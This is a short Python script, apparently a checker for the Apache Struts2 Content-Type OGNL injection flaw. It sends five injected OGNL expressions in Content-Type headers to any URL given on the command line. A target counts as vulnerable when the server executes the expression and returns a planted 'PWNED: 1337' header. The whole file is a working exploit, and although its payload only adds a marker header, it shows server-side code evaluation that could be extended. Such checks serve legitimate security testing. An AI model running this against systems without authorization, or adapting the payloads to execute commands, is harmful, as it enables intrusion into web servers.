#!/usr/bin/python
# -*- coding: utf-8 -*-
# Ajin Abraham
import sys
import urllib2
import httplib

def test(url):
    ognl_payload0 = "%{(#_='multipart/form-data')."
    ognl_payload0 += "(#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('PWNED',1330+7))"
    ognl_payload0 += "}"


    ognl_payload1 = "%{(#_='multipart/form-data')."
    ognl_payload1 += '(#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].addHeader("PWNED",1330+7))'
    ognl_payload1 += "}"


    ognl_payload2 = "~multipart/form-data%{"
    ognl_payload2 += '#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].addHeader("PWNED",1330+7)'
    ognl_payload2 += "}"

    ognl_payload3 = ".multipart/form-data~${"
    ognl_payload3 += '#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].addHeader("PWNED",1330+7)'
    ognl_payload3 += "}"

    ognl_payload4 = "${(#_='multipart/form-data')."
    ognl_payload4 += "(#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('PWNED',1330+7))"
    ognl_payload4 += "}"


    #url = 'http://127.0.0.1:8080/struts2-showcase-2.3.12/showcase.action'
    print "\n[INFO] Injecting Header PWNED: 1337"
    print "\n[INFO] Normal Content-Type Header"
    payloads = [ognl_payload0, ognl_payload1, ognl_payload2, ognl_payload3, ognl_payload4]
    for payload in payloads:
        headers = {'Content-Type': payload}
        request = urllib2.Request(url, headers=headers)
        response = urllib2.urlopen(request)
        data = response.headers
        if "1337" in str(data):
            print "[VULNERABLE] - ", url
            print "[PAYLOAD]\n", payload
            print "[RESPONSE HEADER]\n", data

    print "\n[INFO] Lowercase content-type Header"
    for payload in payloads:
        headers = {'content-type': payload}
        request = urllib2.Request(url, headers=headers)
        response = urllib2.urlopen(request)
        data = response.headers
        if "1337" in str(data):
            print "[VULNERABLE] - ", url
            print "[PAYLOAD]\n", payload
            print "[RESPONSE HEADER]\n", data

    print "\n[INFO] Multiple Content-Type Header"
    for payload in payloads:
        headers = {'content-type': payload, 'Content-Type': 'application/x-www-form-urlencoded'}
        request = urllib2.Request(url, headers=headers)
        response = urllib2.urlopen(request)
        data = response.headers
        if "1337" in str(data):
            print "[VULNERABLE] - ", url
            print "[PAYLOAD]\n", payload
            print "[RESPONSE HEADER]\n", data

if len(sys.argv) < 2:
    sys.exit('Usage: %s <url>' % sys.argv[0])
else:
    test(sys.argv[1])
